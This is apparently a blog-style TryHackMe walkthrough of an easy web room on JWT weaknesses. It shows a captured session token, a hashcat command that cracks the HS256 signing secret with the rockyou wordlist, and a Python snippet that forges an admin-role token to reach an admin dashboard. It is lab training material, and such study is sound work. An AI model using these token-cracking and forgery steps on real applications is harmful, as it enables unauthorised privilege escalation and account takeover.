---
layout: post
title: "TryHackMe: Example Room Walkthrough"
date: 2026-09-01
categories: [TryHackMe, Web]
tags: [Linux, Web, JWT, Authorization]
platform: TryHackMe
difficulty: Easy
os: Linux
description: "Walkthrough of an offensive web room covering JWT signature forgery, weak secrets cracking, and administrative control takeover."
---

## Overview

In this room, we examine common JSON Web Token (JWT) vulnerabilities, including JWT secret cracking using hashcat and algorithm confusion attacks (`alg: none`).

---

## Task 1 — Reconnaissance

We start by capturing a valid session token upon signing up for a standard user account on the target web application:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3VkZWVwYSIsInJvbGUiOiJ1c2VyIn0.s3crM3RTaWduYXR1cmU...
```

Decoding the payload portion reveals:

```json
{
  "user": "sudeepa",
  "role": "user"
}
```

---

## Task 2 — Cracking JWT Secret

Using `hashcat` to crack the HS256 HMAC secret with a standard wordlist:

```bash
$ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Secret identified: `secret123`

---

## Task 3 — Modifying Token & Escalation

Using Python to sign a forged JWT with elevated `admin` privileges:

```python
import jwt

payload = {"user": "sudeepa", "role": "admin"}
secret = "secret123"

token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged Token: {token}")
```

Submitting the forged token grants access to `/admin/dashboard`, completing the room objectives.
